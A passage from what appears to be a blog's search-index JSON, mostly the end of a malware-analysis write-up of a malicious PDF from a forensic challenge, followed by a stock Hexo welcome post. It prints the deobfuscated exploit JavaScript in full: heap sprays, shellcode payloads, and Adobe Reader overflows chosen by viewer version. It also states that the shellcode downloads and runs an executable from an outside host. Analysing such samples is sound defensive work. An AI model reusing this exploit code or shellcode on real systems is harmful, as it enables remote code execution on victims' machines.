12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888; util.printf(&quot;%45000f&quot;, num);}function second_exploit() { // notepad.exe payload var shellcode = unescape(&quot;%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae&quot;); var mem_array = new Array(); var cc = 0x0c0c0c0c; var addr = 0x400000; var sc_len = shellcode.length * 2; var len = addr - (sc_len + 0x38); var yarsp = unescape(&quot;%u9090%u9090&quot;); yarsp = s(yarsp, len); var count2 = (cc - 0x400000) / addr; for (var count = 0; count &lt; count2; count++) { mem_array[count] = yarsp + shellcode; } var overflow = unescape(&quot;%u0c0c%u0c0c&quot;); while (overflow.length &lt; 44952) { overflow += overflow; } this.collabStore = Collab.collectEmailInfo({ subj: &quot;&quot;, msg: overflow });}function third_exploit() { if (app.doc.Collab.getIcon) { var arry = new Array(); // cmd.exe payload var payload = unescape(&quot;%ud3b8%u7458%ud901%u2bcb%ud9c9%u2474%ub1f4%u5a65%u4231%u0312%u1242%u3983%u96a4%u56f4%u0d45%u9bbd%ud7af%ue7f8%u982e%u1dcf%u7aa8%ucad5%u92cf%uf3c1%u9d2f%u4766%ufb49%u941e%uc494%u8389%uacfe%u6ad8%udd95%u0935%uf3a2%u801c%ub2d9%u488c%u2678%u0b5c%udd62%u01f4%u5b82%u4792%u4b5e%u2d2e%ubc2a%uf9ff%ue4c1%u9b9a%u83f7%ucc69%u3938%u1fb1%u7e29%uc50b%ue214%u8248%udcd8%ub3b7%u890b%ue425%uab91%u5210%u5192%uc8fc%u9932%u9def%ubaa1%u0795%u1c9f%uacee%uc5ba%u4b1c%uaf20%u0832%u3e47%u9129%uacf0%ude04%u1062%ue9e7%u0804%uf391%ubf69%ucc69%u71f0%u1108%uccee%u0d20%ubecf%ub462%ud949%u9971%u15e3%u3c5a%ub053%u5d89%u6c82%u6648%u07ae%u7ad2%u148a%ub09d%u1572%u1aab%u33e6%u5a91%ub8af%u4744%udd4a%u8b98%u47f2%u2af0%ub1cc%u03cf%u2707%ufe1e%ued8a%uca57%u23cd%u030e%u7277%u39bc%ubf21%u6423%udf3e%u5d93%uea71%u2a42%u2b4d%ud7b8%u0626%u7de4%ue9b8%ue771%uc85c%u0a82%u1f69%u2e8c%u1db2%u258c%u34bf%u2085%u359e%u98b7%u2cff%ue0a5%u6cf4%uf3c6%u7409%uf5ca%u6919%u60cd%u9a13%u4e19%ua74d%uf71c%ub952%uea11%ucba6%u0839%ud1c0%u2527%ud2c7%u10a5%ud8d8%u62bd%ufff2%u0b9a%uebe9%udfee%u1c04%ud389%u3622%u1d77%u4e5a%u177d%u4c5b%u21b3%u5f43%u31b9%u39a4%ubd2a%u4a21%u1291%uc8e5%u0389%u229e%ub43a%u5e0e%u24c3%ud4aa%ud71d%u7246%u4a4c%u53de%ufbf6%uc952%u7098%u72fa%u153a%u1594%ub5a8%ub801%u2057%u29e5%uc6f9%ud08e%u738b%u275f%u1e42%u22e7%u411a&quot;); var len = 0x400000 - (payload.length * 2 + 0x38); var yarsp = unescape(&quot;%u9090%u9090&quot;); yarsp = s(yarsp, len); var boundary = (0x0c0c0c0c - 0x400000) / 0x400000; for (var i = 0; i &lt; boundary; i++) { arry[i] = yarsp + payload; } var str = unescape(&quot;%09&quot;); while (str.length &lt; 0x4000) { str += str; } str = &quot;N.&quot; + str; app.doc.Collab.getIcon(str); }}function run_exploit_wrapper() { var version = app.viewerVersion.toString(); version = version.replace(/D/g, ''); var version_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2)); if ((version_array[0] == 8) &amp;&amp; (version_array[1] == 0) || (version_array[1] == 1 &amp;&amp; version_array[2] &lt; 3)) { // version == 8.0.[0-1-2] || version == 8.1.[0-1-2] first_exploit(); } if ((version_array[0] &lt; 8) || (version_array[0] == 8 &amp;&amp; version_array[1] &lt; 2 &amp;&amp; version_array[2] &lt; 2)) { // version &lt; 8.x.x || version == 8.[0-1].[0-1] second_exploit(); } if ((version_array[0] &lt; 9) || (version_array[0] == 9 &amp;&amp; version_array[1] &lt; 1)) { // version &lt; 9.x.x || version == 9.0.x third_exploit(); } common_exploit();}run_exploit_wrapper(); Now we can see that there are a lot of exploits functions that are executed when some PDF reader version match. Shellcode AnalysisTL;DR: in this post I will show you only the analysis of common_exploit shellcode otherwise the post would be too long and the analysis would be redoundant because I have applied the same methodology.This step requires to convert the payload containing the shellcode to PE using the shellcode2exe utility, interesting fact: this utility works also with unicode escaped sequence, then I debugged the win exe using x64dbg setting up a bp to LoadLibrary, when hitted I saw that the shellcode tries to load the urlmon library used to interact with some webserver.Stepping through the shellcode execution we can notice that the shellcode tries to use the urlmon‚Äôs function UrlDownloadToFileA, according to MSDN it downloads a file from http[:]//blog.honeynet.org.my/forensic_challenge/malware.4.exe and saves into a file named a.exe inside the C:\\Windows\\System32 folder:Unluckily the web server respondes with 404, so we cannot analyze the second stager.","link":"/2022/02/17/2022-02-17-GetPDF/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy Using KateX to write LateX$$x^2 + \\sqrt{\\alpha \\times \\beta}$$ More info: Deployment","link":"/2020/01/10/tutorial/"}],"tags":[],"categories":[{"name":"Malware Analysis","slug":"Malware-Analysis","link":"/categories/Malware-Analysis/"},{"name":"Windows Internals","slug":"Windows-Internals","link":"/categories/Windows-Internals/"},{"name":"CTF Write-Up","slug":"CTF-Write-Up","link":"/categories/CTF-Write-Up/"}],"pages":[]}